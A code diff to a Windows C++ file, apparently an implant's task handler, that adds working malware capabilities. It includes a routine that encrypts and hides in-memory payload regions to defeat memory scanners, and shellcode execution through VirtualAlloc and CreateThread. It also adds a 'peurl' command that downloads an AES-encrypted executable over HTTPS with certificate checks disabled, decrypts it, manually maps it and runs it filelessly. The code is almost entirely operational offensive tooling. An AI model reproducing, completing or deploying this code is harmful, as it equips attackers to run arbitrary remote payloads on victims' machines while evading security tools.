@@ -16,6 +16,8 @@
 #endif
 
 #include <windows.h>
+#include <winhttp.h>
+#include <wincrypt.h>
 #include <tlhelp32.h>
 #include <string>
 #include <vector>
@@ -461,6 +463,255 @@ inline std::string handle(const std::string& verb, const std::string& args) {
     }
 
     return ""; // not a built-in — host dispatch handles it
+}
+
+// ---- sleep hygiene (memory scanner defeat) ---------------------------------
+static std::mutex g_regionMtx;
+static std::vector<std::pair<void*, size_t>> g_trackedRegions;
+
+inline void trackRegion(void* p, size_t n) {
+    std::lock_guard<std::mutex> lock(g_regionMtx);
+    g_trackedRegions.push_back({ p, n });
+}
+
+// Encrypt + no-access every tracked region during idle; decrypt + RX on wake.
+inline void sleepHygiene(bool hide) {
+    static unsigned char skey = 0x5A;
+    std::lock_guard<std::mutex> lock(g_regionMtx);
+    for (auto& r : g_trackedRegions) {
+        DWORD old = 0;
+        if (!VirtualProtect(r.first, r.second, PAGE_READWRITE, &old)) continue;
+        auto* p = (unsigned char*)r.first;
+        for (size_t i = 0; i < r.second; ++i) p[i] ^= (skey + (unsigned char)(i & 0xFF));
+        VirtualProtect(r.first, r.second, hide ? PAGE_NOACCESS : PAGE_EXECUTE_READ, &old);
+    }
+    skey += 0x40;
+}
+
+inline std::string execTracked(const std::vector<unsigned char>& sc) {
+    void* mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return "exec: VirtualAlloc failed";
+    memcpy(mem, sc.data(), sc.size());
+    trackRegion(mem, sc.size());
+    DWORD old = 0;
+    VirtualProtect(mem, sc.size(), PAGE_EXECUTE_READ, &old);
+    HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
+    if (!t) return "exec: CreateThread failed";
+    CloseHandle(t);
+    return "exec: " + std::to_string(sc.size()) + " bytes running (hygiene-tracked)";
+}
+
+// ---- fileless PE (remote AES-CBC fetch + manual map) ------------------------
+inline std::string b64Decode(const std::string& in, std::vector<unsigned char>& out) {
+    auto nib = [](char c) -> int {
+        if (c >= 'A' && c <= 'Z') return c - 'A';
+        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
+        if (c >= '0' && c <= '9') return c - '0' + 52;
+        if (c == '+') return 62;
+        if (c == '/') return 63;
+        return -1;
+    };
+    out.clear();
+    int val = 0, bits = 0;
+    for (char c : in) {
+        int d = nib(c);
+        if (d < 0) continue;
+        val = (val << 6) | d;
+        bits += 6;
+        if (bits >= 8) { bits -= 8; out.push_back((unsigned char)((val >> bits) & 0xFF)); }
+    }
+    return "";
+}
+
+inline std::string fetchUrlA(const std::string& url, std::vector<unsigned char>& body) {
+    // expect https://host[:port]/path
+    std::string host, path = "/";
+    bool tls = false;
+    unsigned short port = 443;
+    size_t p = url.find("://");
+    std::string rest = p == std::string::npos ? url : url.substr(p + 3);
+    tls = url.rfind("https://", 0) == 0;
+    size_t slash = rest.find('/');
+    host = slash == std::string::npos ? rest : rest.substr(0, slash);
+    if (slash != std::string::npos) path = rest.substr(slash);
+    size_t colon = host.find(':');
+    if (colon != std::string::npos) { port = (unsigned short)atoi(host.substr(colon + 1).c_str()); host = host.substr(0, colon); }
+
+    HINTERNET ses = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!ses) return "WinHttpOpen failed";
+    HINTERNET con = WinHttpConnect(ses, std::wstring(host.begin(), host.end()).c_str(), tls ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!con) { WinHttpCloseHandle(ses); return "WinHttpConnect failed"; }
+    HINTERNET rq = WinHttpOpenRequest(con, L"GET", std::wstring(path.begin(), path.end()).c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, tls ? WINHTTP_FLAG_SECURE : 0);
+    if (!rq) { WinHttpCloseHandle(con); WinHttpCloseHandle(ses); return "WinHttpOpenRequest failed"; }
+    if (tls) {
+        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        WinHttpSetOption(rq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+    }
+    BOOL ok = WinHttpSendRequest(rq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
+           && WinHttpReceiveResponse(rq, nullptr);
+    if (!ok) { WinHttpCloseHandle(rq); WinHttpCloseHandle(con); WinHttpCloseHandle(ses); return "request failed"; }
+    DWORD avail = 0, read = 0;
+    while (WinHttpQueryDataAvailable(rq, &avail) && avail) {
+        std::vector<char> chunk(avail);
+        WinHttpReadData(rq, chunk.data(), avail, &read);
+        body.insert(body.end(), chunk.begin(), chunk.begin() + read);
+    }
+    WinHttpCloseHandle(rq); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
+    return "";
+}
+
+// CAPI AES-256-CBC, key = SHA256(passphrase), IV = first 16 bytes of blob.
+inline std::string aesDecryptCbc(const unsigned char* keyPass, size_t keyLen, std::vector<unsigned char>& blob) {
+    HCRYPTPROV hProv = 0;
+    if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "CryptAcquireContext failed";
+    HCRYPTHASH hHash = 0;
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return "CryptCreateHash failed"; }
+    CryptHashData(hHash, keyPass, (DWORD)keyLen, 0);
+    HCRYPTKEY hKey = 0;
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return "CryptDeriveKey failed"; }
+    CryptDestroyHash(hHash);
+    if (blob.size() <= 16) { CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0); return "blob too small"; }
+    CryptSetKeyParam(hKey, KP_IV, (BYTE*)blob.data(), 0);
+    DWORD len = (DWORD)(blob.size() - 16);
+    BYTE* data = (BYTE*)malloc(len);
+    memcpy(data, blob.data() + 16, len);
+    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &len)) {
+        DWORD e = GetLastError();
+        free(data); CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0);
+        return "CryptDecrypt failed (" + std::to_string(e) + ")";
+    }
+    blob.assign(data, data + len);
+    free(data);
+    CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0);
+    return "";
+}
+
+// Full reflective-style manual mapper with imports + relocations.
+inline std::string manualMapAndRun(std::vector<unsigned char> image) {
+    if (image.size() < 0x40 || image[0] != 'M' || image[1] != 'Z') return "pe: bad MZ";
+    auto rd16 = [&](size_t o) { return *(unsigned short*)(image.data() + o); };
+    auto rd32 = [&](size_t o) { return *(unsigned int*)(image.data() + o); };
+    size_t e_lfanew = rd32(0x3C);
+    if (rd32(e_lfanew) != 0x00004550) return "pe: bad PE sig";
+    size_t coff = e_lfanew + 4;
+    unsigned short numSec = rd16(coff + 2);
+    unsigned short optSize = rd16(coff + 16);
+    size_t opt = coff + 20;
+    unsigned short magic = rd16(opt);
+    bool is64 = magic == 0x20B;
+    unsigned int entryRva = rd32(opt + 16);
+    unsigned long long prefBase = is64 ? *(unsigned long long*)(image.data() + opt + 24) : rd32(opt + 28);
+    unsigned int sizeImg = rd32(opt + 56);
+    unsigned int sizeHdr = rd32(opt + 60);
+    unsigned int impRva = rd32(opt + (is64 ? 120 : 104));
+    unsigned int relRva = rd32(opt + (is64 ? 152 : 136)), relSize = rd32(opt + (is64 ? 156 : 140));
+
+    void* base = VirtualAlloc((void*)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    unsigned long long delta = 0;
+    if (!base) {
+        base = VirtualAlloc(nullptr, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!base) return "pe: VirtualAlloc failed";
+        delta = (unsigned long long)base - prefBase;
+    }
+    memcpy(base, image.data(), sizeHdr);
+    size_t secOff = opt + optSize;
+    for (unsigned short i = 0; i < numSec; ++i) {
+        unsigned char* s = image.data() + secOff + i * 40;
+        unsigned int vaddr = *(unsigned int*)(s + 12);
+        unsigned int rsize = *(unsigned int*)(s + 16);
+        unsigned int rptr = *(unsigned int*)(s + 20);
+        if (rsize && rptr) memcpy((unsigned char*)base + vaddr, image.data() + rptr, rsize);
+    }
+
+    if (delta && relRva && relSize) {
+        unsigned char* walk = (unsigned char*)base + relRva;
+        unsigned char* end = walk + relSize;
+        while (walk < end) {
+            unsigned int pageRva = *(unsigned int*)walk;
+            unsigned int bsize = *(unsigned int*)(walk + 4);
+            if (bsize == 0) break;
+            unsigned int count = (bsize - 8) / 2;
+            for (unsigned int j = 0; j < count; ++j) {
+                unsigned short e = *(unsigned short*)(walk + 8 + j * 2);
+                unsigned short type = e >> 12;
+                if (type == 0) continue;
+                void* target = (unsigned char*)base + pageRva + (e & 0xFFF);
+                if (type == 10 && is64) *(unsigned long long*)target += delta;
+                else if (type == 3 && !is64) *(unsigned int*)target += (unsigned int)delta;
+            }
+            walk += bsize;
+        }
+    }
+
+    if (impRva) {
+        unsigned char* walk = (unsigned char*)base + impRva;
+        for (;; walk += 20) {
+            unsigned int oft = *(unsigned int*)walk;
+            unsigned int nameRva = *(unsigned int*)(walk + 12);
+            unsigned int ft = *(unsigned int*)(walk + 16);
+            if (!oft && !nameRva && !ft) break;
+            if (!nameRva) continue;
+            char* dllName = (char*)base + nameRva;
+            HMODULE hMod = LoadLibraryA(dllName);
+            if (!hMod) continue;
+            unsigned char* lookup = (unsigned char*)base + (oft ? oft : ft);
+            unsigned char* iat = (unsigned char*)base + ft;
+            for (int j = 0;; ++j) {
+                unsigned long long val = is64 ? *(unsigned long long*)(lookup + j * 8) : *(unsigned int*)(lookup + j * 4);
+                if (!val) break;
+                void* func = nullptr;
+                if ((is64 && (val >> 63)) || (!is64 && (val >> 31))) {
+                    func = GetProcAddress(hMod, MAKEINTRESOURCEA((unsigned short)(val & 0xFFFF)));
+                } else {
+                    char* fname = (char*)base + (unsigned int)(val + 2);
+                    func = GetProcAddress(hMod, fname);
+                }
+                if (is64) *(unsigned long long*)(iat + j * 8) = (unsigned long long)func;
+                else *(unsigned int*)(iat + j * 4) = (unsigned int)(size_t)func;
+            }
+        }
+    }
+
+    DWORD oldP = 0;
+    VirtualProtect(base, sizeImg, PAGE_EXECUTE_READWRITE, &oldP);
+    trackRegion(base, sizeImg);
+    HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)((unsigned char*)base + entryRva), nullptr, 0, nullptr);
+    if (!t) return "pe: entry thread failed";
+    CloseHandle(t);
+    char msg[128];
+    sprintf_s(msg, "pe mapped @ 0x%llx (delta %lld) entry running", (unsigned long long)base, (long long)delta);
+    return std::string(msg);
+}
+
+inline std::string task_pe(const std::string& args) {
+    // pe <passphrase> <b64(iv+aes256cbc(pe))>   |   peurl <passphrase> <url>
+    size_t sp = args.find(' ');
+    if (sp == std::string::npos) return "usage: pe <passphrase> <b64> | peurl <passphrase> <url>";
+    std::string first = args.substr(0, sp);
+    std::string rest = args.substr(sp + 1);
+
+    std::vector<unsigned char> blob;
+    if (first == "peurl") {
+        size_t sp2 = rest.find(' ');
+        if (sp2 == std::string::npos) return "usage: peurl <passphrase> <url>";
+        std::string pass = rest.substr(0, sp2);
+        std::string url = rest.substr(sp2 + 1);
+        std::string ferr = fetchUrlA(url, blob);
+        if (!ferr.empty()) return "pe: " + ferr;
+        std::string b64s(blob.begin(), blob.end());
+        std::string derr = b64Decode(b64s, blob);
+        if (!derr.empty()) return "pe: " + derr;
+        std::string derr2 = aesDecryptCbc(pass.data(), pass.size(), blob);
+        if (!derr2.empty()) return "pe: " + derr2;
+    } else {
+        std::string pass = first;
+        std::string derr = b64Decode(rest, blob);
+        if (!derr.empty()) return "pe: " + derr;
+        std::string derr2 = aesDecryptCbc(pass.data(), pass.size(), blob);
+        if (!derr2.empty()) return "pe: " + derr2;
+    }
+    return manualMapAndRun(blob);
 }
 
 } // namespace pr_tasks
